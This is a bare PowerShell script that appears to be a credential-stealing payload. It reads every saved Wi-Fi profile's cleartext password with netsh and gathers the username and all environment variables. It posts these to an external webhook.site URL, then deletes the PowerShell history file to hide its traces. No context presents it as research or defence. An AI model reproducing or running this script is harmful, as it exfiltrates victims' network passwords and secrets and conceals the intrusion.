netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
  $wlan  = $_.Matches.Value
  $pass = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
  $Body = @{
    'username' = $env:username
    'wifi'= $wlan + " : " + $pass
    'env' = (gci env:*).GetEnumerator() | Out-String
  }
  Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/abd9d9ea-249b-4068-881b-1e4b83564fba -Method Post -Body ($Body | ConvertTo-Json)
}
Remove-Item (Get-PSReadlineOption).HistorySavePath
exit
